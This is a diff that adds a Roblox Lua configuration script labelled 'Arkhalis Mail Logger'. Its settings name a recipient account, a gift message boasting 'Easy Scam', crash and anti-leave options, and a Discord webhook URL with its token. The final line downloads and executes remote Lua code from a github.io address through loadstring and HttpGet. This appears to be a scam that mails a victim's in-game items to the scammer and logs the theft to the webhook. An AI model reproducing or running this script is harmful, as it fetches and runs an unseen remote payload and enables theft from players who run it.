@@ -1,0 +1,24 @@
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+_G.Username = "Kajspik_k1" 
+_G.GiftMessage = "Easy Scam Arkhalis ON TOP" 
+
+_G.Diamonds = 500000 
+_G.UnlockPets = true 
+_G.AntiLeave = true 
+_G.Crash = true  
+
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1102624208497954887/JUpPBcvNgr-4uLhb-1rwtRanfTobdF9BBQ9Wc01n2qhRDbQ4k55FbuVpaKwX3lM_zl33" 
+
+--[[ UI Config ]]--
+_G.ScriptName = "XD" --// Script Name On The UI
+_G.Tip1 = "Easy" --// Gives You Tips On The UI
+_G.Tip2 = "Get" --// Gives You Tips On The UI
+_G.Tip3 = "Locked" --// Gives You Tips On The UI
+_G.Tip4 = "LOL" --// Gives You Tips On The UI
+_G.Tip5 = "ARKHALIS ON TOP THX FOR UR HUGES" --// Gives You Tips On The UI
+--[[ Script ]]--
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/ArkhalisMailbox.lua"))()
